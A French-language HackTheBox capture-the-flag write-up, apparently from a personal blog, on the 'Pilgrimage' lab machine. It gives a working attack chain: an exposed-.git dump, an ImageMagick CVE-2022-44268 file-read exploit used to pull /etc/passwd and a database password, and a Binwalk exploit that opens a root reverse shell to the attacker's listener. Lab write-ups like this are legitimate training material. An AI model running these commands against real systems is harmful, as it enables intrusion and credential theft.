@@ -1,0 +1,133 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>HackTheBox - Pilgrimage | Vithurshan SELVARAJAH</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/fonts.css></head><body><nav><ul class=menu><li><a href=/>Home</a></li><li><a href=/notes/>Notebook</a></li><li><a href=/categories/>Categories</a></li><li><a href=/projects/>Projects</a></li><li><a href=/index.xml>RSS</a></li></ul><hr></nav><div class=article-meta><h1><span class=title>HackTheBox - Pilgrimage</span></h1><h2 class=date>2023/07/24</h2></div><main><h2 id=énumération>Énumération</h2><p>Scanner la machine :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo nmap -sC -sV 10.10.11.219
+</span></span></code></pre></div><ul><li><code>-sC</code> : Scanner la cible en utilisant les scripts par défaut</li><li><code>-sV</code> : Déterminer la version du service en cours d&rsquo;exécution sur le port.</li></ul><p>Résultat du scan Nmap :</p><pre tabindex=0><code class=language-nil data-lang=nil>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-21 09:09 CEST
+Nmap scan report for 10.10.11.219
+Host is up (0.013s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
+|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
+|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
+
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://pilgrimage.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds
+</code></pre><p>D&rsquo;après le résultat de Nmap, le port 22 et 80 sont ouverte sur la machine. La requête HTTP <code>GET http://10.10.11.219</code> nous retourne une réponse <code>302</code> qui nous indique que la page que nous demandons (dans notre cas page d&rsquo;index ou <code>/</code>) a été déplacée vers l&rsquo;emplacement <code>http://pilgrimage.htb/</code>.</p><p>Mais nous n&rsquo;avons pas un système de résolution de nom de domaine qui résout <code>pilgrimage.htb</code> en IP. Donc devons le renseigner manuellement dans le fichier <code>/etc/hosts</code> afin de permettre à Nmap de résoudre le nom domaine <code>pilgrimage.htb</code> en IP <code>10.10.11.219</code>:</p><pre tabindex=0><code class=language-nil data-lang=nil># Pilgrimage - HackTheBox
+10.10.11.219	pilgrimage.htb
+</code></pre><p>Réessayons maintenant le scan Nmap :</p><pre tabindex=0><code class=language-nil data-lang=nil>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-21 09:11 CEST
+Nmap scan report for pilgrimage.htb (10.10.11.219)
+Host is up (0.012s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
+|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
+|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
+80/tcp open  http    nginx 1.18.0
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: nginx/1.18.0
+|_http-title: Pilgrimage - Shrink Your Images
+| http-git:
+|   10.10.11.219:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
+|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
+</code></pre><p>Le serveur web hébergeant un répertoire Git <code>.git</code> accessible via le protocole HTTP. Nous pouvons utiliser l&rsquo;outil <code>git-dumper</code> pour télécharger le répertoire en utilisant le protocole HTTP:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>git-dumper http://pilgrimage.htb/.git/ git_dump
+</span></span></code></pre></div><h2 id=découverte-et-exploitation-des-vulnérabilités>Découverte et exploitation des vulnérabilités</h2><p>Le code source de l&rsquo;application web nous indique l&rsquo;utilisation de logiciel <code>ImageMagick</code> pour rétrécir (ou shrink en Anglais) l&rsquo;image:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// ...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/&#34;</span> <span style=color:#f92672>.</span> $upload<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>getName</span>() <span style=color:#f92672>.</span> $mime <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34; -resize 50% /var/www/pilgrimage.htb/shrunk/&#34;</span> <span style=color:#f92672>.</span> $newname <span style=color:#f92672>.</span> $mime);
+</span></span><span style=display:flex><span><span style=color:#75715e>// ...
+</span></span></span></code></pre></div><p>La version de <code>ImageMagick</code> qu&rsquo;elle utilise:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>git_dump/magick --version
+</span></span></code></pre></div><pre tabindex=0><code class=language-nil data-lang=nil>Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
+Copyright: (C) 1999 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5)
+Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
+Compiler: gcc (7.5)
+</code></pre><p>Après quelques recherches sur Internet, la version <code>7.1.0-49</code> de <code>ImageMagick</code> utilisée par l&rsquo;application Web est vulnérable à l&rsquo;inclusion du fichier local.</p><p>Détail de la vulnérabilité :
+<a href=https://www.metabaseq.com/imagemagick-zero-days/>https://www.metabaseq.com/imagemagick-zero-days/</a></p><p>Exploit :</p><ol><li><a href=https://github.com/voidz0r/CVE-2022-44268>CVE-2022-44268 Arbitrary File Read PoC - PNG generator</a></li><li><a href=https://github.com/Sybil-Scan/imagemagick-lfi-poc>ImageMagick LFI PoC [CVE-2022-44268]​</a></li></ol><p>Téléchargeons le deuxième script et générons un exploit de test permet de lire le contenu du fichier <code>/etc/passwd</code> :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>git clone https://github.com/Sybil-Scan/imagemagick-lfi-poc.git
+</span></span><span style=display:flex><span>python3 imagemagick-lfi-poc/generate.py -f <span style=color:#e6db74>&#34;/etc/passwd&#34;</span> -o exploit.png
+</span></span></code></pre></div><p>Accéder à l&rsquo;adresse <a href=http://pilgrimage.htb/>http://pilgrimage.htb/</a> en utilisant un navigateur Web et uploader le ficher <code>exploit.png</code> en cliquant sur <code>Choose File</code>. Maintenant si tout fonctionne correctement, nous pouvons télécharger l&rsquo;image en cliquant sur le lien envoyé en réponse à la requête HTTP POST et décoder l&rsquo;image pour voir le contenu du fichier <code>/etc/passwd</code>.</p><p>Nous pouvons aussi utiliser <code>Curl</code> en ligne de commande afin d&rsquo;automatiser l&rsquo;upload du ficher <code>exploit.png</code> sur <a href=http://pilgrimage.htb/>http://pilgrimage.htb/</a> :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>curl -F <span style=color:#e6db74>&#34;toConvert=@exploit.png&#34;</span> http://pilgrimage.htb/ -v 2&gt;&amp;<span style=color:#ae81ff>1</span> | grep -i location | cut -d <span style=color:#e6db74>&#34; &#34;</span> -f3 | cut -d <span style=color:#e6db74>&#34;&amp;&#34;</span> -f1 | cut -d <span style=color:#e6db74>&#34;=&#34;</span> -f2
+</span></span></code></pre></div><p>Si l&rsquo;exploit <code>exploit.png</code> a fonctionné correctement, l&rsquo;image que nous venons de télécharger devrait contenir le contenu du fichier <code>/etc/passwd</code> et nous pouvons l&rsquo;obtenir avec la commande :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>identify -verbose result.png | awk <span style=color:#e6db74>&#39;/Raw profile type/{flag=1; next} /signature/{flag=0} flag&#39;</span>
+</span></span></code></pre></div><p>Le contenu du fichier <code>/etc/passwd</code> est encodé en HEX, nous devons le convertir en ASCII. Pour cela, nous utilisons le script python :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>hex_dump<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    1437
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(bytes<span style=color:#f92672>.</span>fromhex(hex_dump)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#34;utf-8&#34;</span>))
+</span></span></code></pre></div><p>D&rsquo;après l&rsquo;inspection du ficher <code>/etc/passwd</code>, nous savons il y a deux utilisateurs qui ont droit de connecter sur système:</p><pre tabindex=0><code class=language-nil data-lang=nil>root:x:0:0:root:/root:/bin/bash
+emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
+</code></pre><p>Analysons le code source de l&rsquo;application web pour un mot de passe ou accès à l&rsquo;utilisateur <code>emily</code> afin d&rsquo;obtenir le flag et nous pourrions voir l&rsquo;utilisation de la base de données SQLite:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;user&#39;</span>])) {
+</span></span><span style=display:flex><span>    $db <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>PDO</span>(<span style=color:#e6db74>&#39;sqlite:/var/db/pilgrimage&#39;</span>);
+</span></span><span style=display:flex><span>    $stmt <span style=color:#f92672>=</span> $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;INSERT INTO `images` (url,original,username) VALUES (?,?,?)&#34;</span>);
+</span></span><span style=display:flex><span>    $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>(<span style=color:#66d9ef>array</span>($upload_path,$_FILES[<span style=color:#e6db74>&#34;toConvert&#34;</span>][<span style=color:#e6db74>&#34;name&#34;</span>],$_SESSION[<span style=color:#e6db74>&#39;user&#39;</span>]));
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Essayons maintenant d&rsquo;extraire le contenu du fichier <code>/var/db/pilgrimage</code> en utilisant la même méthode utilisée pour extraire le contenu du fichier <code>/etc/passwd</code>. Convertissez ensuite les données de HEX en ASCII en utilisant le script Python utilisé ci-dessus ou le site Web <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')">CyberChef</a> . Et nous pouvons voir le mot de passe de l&rsquo;utilisateur <code>emily</code>.</p><p>Ensuite, nous pouvons nous connecter à la machine en utilisant SSH en tant qu&rsquo;utilisateur <code>emily</code> avec le mot de passe obtenu et obtenir le flag de répertoire personnel d&rsquo;<code>emily</code></p><h2 id=privilege-escalation>Privilege escalation</h2><p>En parcourant la liste des processus, nous avons pu trouver un processus <code>/bin/bash /usr/sbin/malwarescan.sh</code> qui s&rsquo;exécute avec le privilège root. Ce script utilise l&rsquo;outil <code>Binwalk</code> <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup> pour empêcher l&rsquo;upload des fichiers exécutables et des fichiers exécutables du Microsoft:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>blacklist<span style=color:#f92672>=(</span><span style=color:#e6db74>&#34;Executable script&#34;</span> <span style=color:#e6db74>&#34;Microsoft executable&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | <span style=color:#66d9ef>while</span> read FILE; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/var/www/pilgrimage.htb/shrunk/</span><span style=color:#66d9ef>$(</span>/usr/bin/echo <span style=color:#e6db74>&#34;</span>$FILE<span style=color:#e6db74>&#34;</span> | /usr/bin/tail -n <span style=color:#ae81ff>1</span> | /usr/bin/sed -n -e <span style=color:#e6db74>&#39;s/^.*CREATE //p&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    binout<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>/usr/local/bin/binwalk -e <span style=color:#e6db74>&#34;</span>$filename<span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> banned in <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>blacklist[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#34;</span>$binout<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>==</span> *<span style=color:#e6db74>&#34;</span>$banned<span style=color:#e6db74>&#34;</span>* <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>	    /usr/bin/rm <span style=color:#e6db74>&#34;</span>$filename<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>	    break
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>D&rsquo;après quelque recherches sur la version v2.3.2 de Binwalk, la version est vulnérable à l&rsquo;exécution de commandes à distance (RCE) et un exploit est présent sur le site <a href=https://www.exploit-db.com/exploits/51249>exploit-db</a>. Ce script génère une image contenant un payload qui renvoie un reverse shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python3 51249.py superImage.png 10.10.14.248 <span style=color:#ae81ff>443</span>
+</span></span></code></pre></div><ul><li><code>51249.py</code> L&rsquo;exploit téléchargé</li><li><code>superPhoto.png</code> Une image quelconque.</li><li><code>10.10.14.248</code>, <code>443</code> IP et port du Netcat en écoute afin capturer un reverse shell.</li></ul><p>Avant d&rsquo;importer l&rsquo;exploit <code>binwalk_exploit.png</code> sur le serveur, lançons Netcat à l&rsquo;écoute des nouvelles connexions:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc -nvlp <span style=color:#ae81ff>443</span>
+</span></span></code></pre></div><p>Maintenant nous pouvons l&rsquo;importer sur le serveur en utilisant l&rsquo;identifiant d&rsquo;<code>emily</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>scp binwalk_exploit.png emily@10.10.11.219:
+</span></span></code></pre></div><p>Transférons ensuite l&rsquo;exploit <code>binwalk_exploit.png</code> dans le dossier <code>/var/www/pilgrimage.htb/shrunk/</code> afin que le script <code>malwarescan.sh</code> puisse l&rsquo;utiliser et nous renvoie un reverse shell en tant que <code>root</code>.</p><p>Le flag est dans le répertoire <code>/root</code>.</p><h2 id=références>Références</h2><ol><li><p>Envoyer des requêtes HTTP en utilisant <code>Curl</code> :</p><ul><li><a href=https://linuxize.com/post/curl-post-request/>How to make a POST request with cURL</a></li><li><a href=https://everything.curl.dev/http/multipart>Multipart formposts</a></li></ul></li><li><p>Convertisseur HEX vers ASCII :</p><ul><li><a href=https://gchq.github.io/CyberChef>CyberChef</a> - A web app for encryption, encoding, compression and data analysis</li></ul></li></ol><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://github.com/ReFirmLabs/binwalk>Binwalk</a> est un outil rapide et facile à utiliser pour l&rsquo;analyse, l&rsquo;ingénierie inverse et l&rsquo;extraction d&rsquo;images de firmware.&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></main><footer><hr>© <a href=https://www.atomicl.net>Vithurshan SELVARAJAH</a> 2022 &ndash; 2023 | <a href=https://github.com/BlackcatRs>Github</a> | <a href=https://www.linkedin.com/in/vithurshan-selvarajah/>LinkedIn</a></footer></body></html>
